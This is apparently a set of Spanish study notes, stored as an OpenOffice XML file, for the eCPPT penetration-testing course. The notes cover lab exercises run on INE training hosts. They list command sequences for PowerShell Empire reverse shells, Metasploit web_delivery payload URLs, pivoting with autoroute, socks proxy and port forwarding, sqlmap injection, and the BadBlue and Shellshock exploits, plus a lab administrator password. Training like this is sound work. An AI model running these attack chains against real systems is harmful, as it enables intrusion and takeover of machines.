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paragraph-properties fo:padding="0.074cm" fo:border-left="none" fo:border-right="none" fo:border-top="none" fo:border-bottom="0.002cm solid #000000" style:join-border="false"/>
    </style:style>
    <style:style style:name="T1"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IENTO CURSO eCPPT:</text:p>
      <text:p text:style-name="Standard">En la Ecppt el escaneo de red es otro distinto, normalmente la máquina que escaneamos tiene dos interfaces de red para después de vulnerarla poder hacer el pivoting. Por tanto nmap va dirigido normalmente a un dominio.</text:p>
      <text:p text:style-name="Standard">HERRAMIENTA<text:tab/><text:tab/><text:tab/>USO</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">NIKTO<text:tab/><text:tab/><text:tab/><text:tab/>ESCANEO DE UNA WEB</text:p>
      <text:p text:style-name="Standard">POWERSHELL-EMPIRE<text:tab/><text:tab/>CLIENTE-SERVIDOR PARA RECIBIR REVERSHELL</text:p>
      <text:p text:style-name="Standard">msfvenom<text:tab/><text:tab/><text:tab/>crear cargas útiles para meterlas y la victima y recibir revershell</text:p>
      <text:p text:style-name="Standard">burpsuite<text:tab/><text:tab/><text:tab/>captura y edición de paquetes http</text:p>
      <text:p text:style-name="Standard">Gobuster/dirbuster<text:tab/><text:tab/>enumeración de directorios fuerza bruta</text:p>
      <text:p text:style-name="Standard">SQLmap<text:tab/><text:tab/><text:tab/><text:tab/>SQL injection</text:p>
      <text:p text:style-name="Standard">SPIKE<text:tab/><text:tab/><text:tab/><text:tab/>FUZZING para descubrir vulnerabilidades </text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">*ESCANER RED:</text:p>
      <text:p text:style-name="Standard">"ip a" y nos apuntamos nuestra ip</text:p>
      <text:p text:style-name="Standard">nmap -p- demo.ine.local</text:p>
      <text:p text:style-name="Standard">para saber la ip de un dominio solo tenemos que hacer "ping dominio" y el baner nos da la ip.</text:p>
      <text:p text:style-name="Standard">*POWERSHELL:</text:p>
      <text:p text:style-name="Standard">Procedimiento powershell:</text:p>
      <text:p text:style-name="Standard">Primero explotas la maquina victima windows, y una vez tienes acceso con bajos privilegios y abres el powershell. Lanzas un par de comandos ya hechos que te dan administrador&amp;password, con eso lanzas otro comando ya hecho (runas.exe /user:administrator cmd), le metes la password y se te abre un cmd como administrador.</text:p>
      <text:p text:style-name="Standard">Eso lo dejamos ahí, y nos vamos a nuestro kali. Abrimos metasploit con el mòdulo de hta para generar una URL. Esa URL la copiamos y nos vamos de nuevo al windows para pegarla en el cmd que está corriendo como administrador y al ejecutar la URL nos da una meterpreter como administrador en nuestro metasploit. </text:p>
      <text:p text:style-name="Standard">DE DÓNDE SACAMOS USUARIO Y CONTRASEÑA PARA ABRIR UN CMD COMO ADMINISTRADOR DESDE POWERSHELL?:</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:soft-page-break/>########LABORATORIO 1 DE POWERSHELL-EMPIRE:###########</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">-Con user&amp;pass de maquina victima: smbexec.py 'Administrator:abc_123321!@#'@demo.ine.local</text:p>
      <text:p text:style-name="Standard">se nos abrirá un cmd como administrador.<text:tab/></text:p>
      <text:p text:style-name="Standard">*Teniendo cmd root en la victima, es momento de conseguir una sesion root en power-empire de nuestro kali:</text:p>
      <text:p text:style-name="Standard">1) "powershell-empire server" levantamos el servidor y minimizamos esta ventana.</text:p>
      <text:p text:style-name="Standard">2) "powershell-empire client" iniciamos el cliente.</text:p>
      <text:p text:style-name="Standard">- "uselistener http", preparamos nuestro cliente para escuchar en el http que es el protocolo usado por el puerto vulnerable. "set Host ipkali", "set Port 8888", "execute".</text:p>
      <text:p text:style-name="Standard">YA TENEMOS NUESTRO CLIENTE ESCUCHANDO.</text:p>
      <text:p text:style-name="Standard">3)"main" <text:s/>para dejar en segundo plano al uselistener y poder seguir trabajando.</text:p>
      <text:p text:style-name="Standard">"usestager multi/launcher", vamos a generar un stager para ejecutarlo en el cmd root de la victima windows.</text:p>
      <text:p text:style-name="Standard">Rellenamos con "set Listener http", "execute".</text:p>
      <text:p text:style-name="Standard">4)Copiamos el comando generado y lo pegamos en el cmd root de la maquina windows. Recibiremos una revershell en nuestro powershell-empire.</text:p>
      <text:p text:style-name="Standard">8)"agents" para ver las sesiones activas</text:p>
      <text:p text:style-name="Standard">"interact NAME_sesion" para iniciar la sesion</text:p>
      <text:p text:style-name="Standard">"usemodule modulopowershell" para usar cualquier modulo de powershell, "execute" para lanzarlo.</text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T1">"usemodule powershell/situational_awareness/network/portscan", "set Hosts ipvictima", "execute".</text:span></text:p>
      <text:p text:style-name="Standard">YA SABEMOS LOS PUERTOS ABIERTOS.</text:p>
      <text:p text:style-name="Standard">*TENIENDO ACCESO A LA SEGUNDA MAQUINA Y HABIENDO OBTENIDO LOS PUERTOS ABIERTOS CON POWERSHELL-EMPIRE, AHORA NECESITAMOS UNA METERPRETER EN LA SEGUNDA MAQUINA VICTIMA, PARA ESO PRIMERO HAY QUE TRANSFERIR NUESTRO AGENTE EMPIRE EXISTENTE A METASPLOIT Y DESDE AHÍ EJECUTAREMOS EL ATAQUE.</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:soft-page-break/>**TRANSFIRIENDO AGENTE EMPIRE A METASPLOIT:</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">Para ello, podemos usar el módulo " invoke_metasploitpayload " de Empire. El módulo, como su nombre lo indica, nos permite ejecutar una carga útil de Metasploit, que enviará efectivamente nuestro agente Empire a un receptor que hayamos configurado dentro de Metasploit.</text:p>
      <text:p text:style-name="Standard">Nuestro primer paso es generar una carga útil que podamos enviar al agente Empire. Para ello, utilizaremos el módulo "web_delivery" de Metasploit. El módulo web_delivery nos permitirá generar una URL de carga útil de PowerShell, que luego proporcionaremos al agente Empire a través del módulo " invoke_metasploitpayload ".</text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T1">1)"service postgresql start &amp;&amp; msfconsole</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T1">"use exploit/multi/script/web_delivery", "set target 2", "set SRVHOST ipkali", "set lhost ipkali", "set payload windows/meterpreter/reverse_tcp", "run"</text:span></text:p>
      <text:p text:style-name="Standard">Utilizaremos la URL identificada por el mensaje "Usando URL:" en la salida del módulo web_delivery anterior.</text:p>
      <text:p text:style-name="Standard">http://10.10.15.2:8080/E8tlUIOl</text:p>
      <text:p text:style-name="Standard">2)Volvemos a powershell-empire para pasar nuestro agente a metasploit, necesitamos cargar el módulo invoke_metasploitpayload.</text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T1">"usemodule powershell/code_execution/invoke_metasploitpayload"</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T1">"set URL http://10.10.15.2:8080/E8tlUIOl", "execute".</text:span></text:p>
      <text:p text:style-name="Standard">YA HEMOS RECIBIDO LA SESION EN METASPLOIT, Podemos continuar con nuestra tarea de pivotar y explotar la segunda máquina.</text:p>
      <text:p text:style-name="Standard">Nota: Si no pudo establecer una sesión de Meterpreter, elimine todos los trabajos actuales de Metasploit (jobs -K) e intente nuevamente con un escucha y una carga útil x64. ¡Funcionará perfectamente!.</text:p>
      <text:p text:style-name="Standard">*AHORA HACEMOS EL PIVOTING A LA SEGUNDA MÁQUINA:</text:p>
      <text:p text:style-name="Standard">3)primero queremos ejecutar el módulo "autoroute" en nuestra nueva sesión de meterpreter. Esto agregará las rutas necesarias a la tabla de enrutamiento de Metasploit que nos permitirán pasar a la máquina 10.0.28.181:</text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T1">"use post/multi/manage/autoroute"</text:span></text:p>
      <text:p text:style-name="Standard">"set SESSION 1" porque corresponde con la sesion 1 que hemos transferido desde powershell-empire</text:p>
      <text:p text:style-name="Standard">"run"</text:p>
      <text:p text:style-name="Standard"><text:soft-page-break/></text:p>
      <text:p text:style-name="Standard">4)Ahora podemos usar el módulo Socks_proxy para hacer un proxy a través de la máquina victima1 y realizar un reconocimiento adicional:</text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T1">"use auxiliary/server/socks_proxy"</text:span></text:p>
      <text:p text:style-name="Standard">"set SRVHOST ipkali"</text:p>
      <text:p text:style-name="Standard">"run"</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">5) A continuación, después de configurar el módulo proxy Socks, necesitamos configurar nuestro navegador para usar nuestro proxy Socks5.</text:p>
      <text:p text:style-name="Standard">Abra Configuración de red en el navegador Firefox y busque proxy, en "manual proxy configuration" metemos la ipkali en "socks host", puerto 1080, marcamos socks_v5. Aceptamos.</text:p>
      <text:p text:style-name="Standard">Abra otra pestaña en Firefox. Deberíamos poder navegar hasta fileserver.ine.local o 10.2.17.147, que es la segunda victima porque tenemos hecho un socket desde la maquina que tiene acceso a la segunda maquina.</text:p>
      <text:p text:style-name="Standard">6)Vemos que tiene una web badblue que podremos explotar con metasploit. Volvemos a metasploit:</text:p>
      <text:p text:style-name="Standard">"search badblue"</text:p>
      <text:p text:style-name="Standard">Hay dos módulos relacionados con badblue. Seleccionaremos el segundo. Configuraremos RHOSTS y PAYLOAD.</text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T1">"use 1"</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T1">"set RHOSTS fileserver.ine.local"</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T1">"set PAYLOAD windows/meterpreter/bind_tcp"</text:span></text:p>
      <text:p text:style-name="Standard">SI EL AUTOROUTE ESTÁ BIEN HECHO DEBE LLEGAR A LA MAQUINA Y EXPLOTARLA.</text:p>
      <text:p text:style-name="Standard">YA TENEMOS METERPRETER EN LA SEGUNDA VICTIMA, HEMOS HECHO PIVOTING. La flag está en C:\</text:p>
      <text:p text:style-name="Standard">-------------</text:p>
      <text:p text:style-name="Standard">*SQL INJECTION:</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">Buscamos en google el exploit de la vulnerabilidad web y lo leemos; nos dice que tiene una vulnerabilidad en el campo "words_exact" en el metodo POST. Con eso lanzamos el siguiente comando en nuestro kali:</text:p>
      <text:p text:style-name="Standard"><text:soft-page-break/></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T1">sqlmap -u "http://xcsokyoocmginvr24rsewa6py.public1.attackdefenselabs.com/dosearch.php" --data "words_exact=" -p words_exact --method POST</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T1">Enter the following answer when asked for questions.</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T1">“y” for “Do you want to skip test payloads specific for other DBMses?”</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T1">“y” for “do you want to include all tests for 'MySQL' extending provided level (1) and risk (1)</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T1">values?”</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T1">“n” for “Do you want to keep testing the others (if any) ?”</text:span></text:p>
      <text:p text:style-name="Standard">Nos genera los payloads para poder ejecutarlos en el campo "words_exact" de la pagina web, pero antes de lanzarlos tenemos que asegurarnos que en ese campo no exista un maximo de palabras (maxlenght), y si existe lo borramos. Pinchamos en el campo con boton derecho, inspeccionar elemento y borramos el maxlenght.</text:p>
      <text:p text:style-name="P2">Ahora ya podemos ejecutar el payload en el campo words_exact. Si no sabemos donde está el campo podemos encontrarlo inspeccionando la pagina.</text:p>
      <text:p text:style-name="Standard">*PIVOTING:</text:p>
      <text:p text:style-name="Standard">TENEMOS LA METERPRETER DE LA PRIMERA VICTIMA. HACEMOS IPCONFIG Y VEMOS QUE TIENE DOS DIRECCIONES IP, LA 2ºIP HAY QUE METERLA EN EL AUTOROUTE DE METASPLOIT.</text:p>
      <text:p text:style-name="Standard">-En meterpreter: "run autoroute -s 192.161.244.0/24", metemos la red, no la IP.</text:p>
      <text:p text:style-name="Standard">"background", salimos de meterpreter.</text:p>
      <text:p text:style-name="Standard">"use auxiliary/scanner/portscan/tcp" para enumerar la nueva red.</text:p>
      <text:p text:style-name="Standard">"set rhosts 192.161.244.2-252" enumeramos casi todos los hosts de la red. "run"</text:p>
      <text:p text:style-name="Standard">VEMOS QUE TIENE EL PUERTO 80 ABIERTO, VAMOS A HACER PORTFORWARDING:</text:p>
      <text:p text:style-name="Standard">Reenviamos el puerto 80 de la nueva victima (192.161.244.3) al puerto 1234 de nuestro kali para poder pasarle el nmap.</text:p>
      <text:p text:style-name="Standard">"sessions -i nºsesion", iniciamos meterpreter con la sesion que tiene acceso a esta nueva maquina.</text:p>
      <text:p text:style-name="Standard">"portfwd add -l 1234 -p 80 -r 192.161.244.3"</text:p>
      <text:p text:style-name="Standard">"portfwd list" muestra la lista que se ha creado.</text:p>
      <text:p text:style-name="Standard">"background", salimos a metasploit.</text:p>
      <text:p text:style-name="Standard">"nmap -sV -p 1234 localhost", enumerando el puerto 1234 es lo mismo que enumerar el puerto 80 de la nueva victima 192.161.244.3</text:p>
      <text:p text:style-name="Standard"><text:soft-page-break/>PODEMOS HACER ESTO CON TODOS LOS PUERTOS ABIERTOS DE LA VICTIMA, LOS AÑADIMOS A LA LISTA DE FORWARDING Y PODREMOS PASARLES EL NMAP A TODOS. AQUÍ SOLO NOS HEMOS CENTRADO EN EL PUETO 80.</text:p>
      <text:p text:style-name="Standard">Vemos que tiene un apache en el puerto 80, lo visitamos en nuestro navegador: http://localhost;1234</text:p>
      <text:p text:style-name="Standard">Ejecutemos el Apache mod_cgi Bash Environment Variable Injectionmódulo del escáner para identificar la vulnerabilidad de shellshock. Acerca de la vulnerabilidad ShellShock, también conocida como CVE-2014-6271.</text:p>
      <text:p text:style-name="Standard">Utilice el módulo auxiliar apache_mod_cgi_bash_env</text:p>
      <text:p text:style-name="Standard">El TARGETURI lo podemos ver en el código fuente de la página, es donde se ejecutan los scripts (src="/cgi-bin/stats"). Lanzamos el auxiliari con "run" y nos dice que el servidor de destino es vulnerable a la vulnerabilidad ShellShock. Utilicemos el exploit /multi/http/apache_mod_cgi_bash_env_exec</text:p>
      <text:p text:style-name="Standard">ATENCIÓN!: DEBIDO A QUE ESTAMOS EN UNA MÁQUINA A LA QUE NO TENEMOS ACCESO DIRECTO POR SER PIVOTANTE</text:p>
      <text:p text:style-name="Standard">El PAYLOAD NO es válido EL predeterminado es "enlinux/x86/meterpreter/reverse_tcp".</text:p>
      <text:p text:style-name="Standard">El 192.161.244.3 objetivo no es accesible desde la máquina Kali, por lo que no podemos usar la "reverse_tcpc". Este es un paso esencial para que podamos elegir la carga útil válida. </text:p>
      <text:p text:style-name="Standard">En este caso, tenemos que usar la "bind_tcp" carga útil para obtener la sesión de meterpreter.</text:p>
      <text:p text:style-name="Standard">Si elegimos el reverse_tcp,exploit, funcionará pero no nos dará una sesión de meterpreter.</text:p>
      <text:p text:style-name="Standard">"set PAYLOAD linux/x86/meterpreter/bind_tcp"</text:p>
      <text:p text:style-name="Standard">"set RHOSTS 192.161.244.3"</text:p>
      <text:p text:style-name="Standard">"set TARGETURI /cgi-bin/stats"</text:p>
      <text:p text:style-name="Standard">"exploit"</text:p>
      <text:p text:style-name="P2">AHORA SÍ TENEMOS LA METERPRETER EN LA MÁQUINA PIVOTANT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es" style:country-asian="ES" style:font-name-complex="Courier New1" style:font-size-complex="10pt"/>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style:text-properties style:font-name="Courier New" fo:font-size="10pt" style:font-name-asian="Times New Roman" style:font-size-asian="10pt" style:language-asian="es" style:country-asian="ES" style:font-name-complex="Courier New1" style:font-size-complex="10pt"/>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1" style:font-size-complex="10pt"/>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ito Camelas bolas</meta:initial-creator>
    <meta:editing-cycles>9</meta:editing-cycles>
    <meta:creation-date>2024-08-09T23:12:00</meta:creation-date>
    <dc:date>2024-08-16T04:16:54.89</dc:date>
    <meta:editing-duration>P3DT6H14M27S</meta:editing-duration>
    <meta:generator>OpenOffice/4.1.8$Win32 OpenOffice.org_project/418m3$Build-9803</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="7" meta:paragraph-count="108" meta:word-count="1439" meta:character-count="98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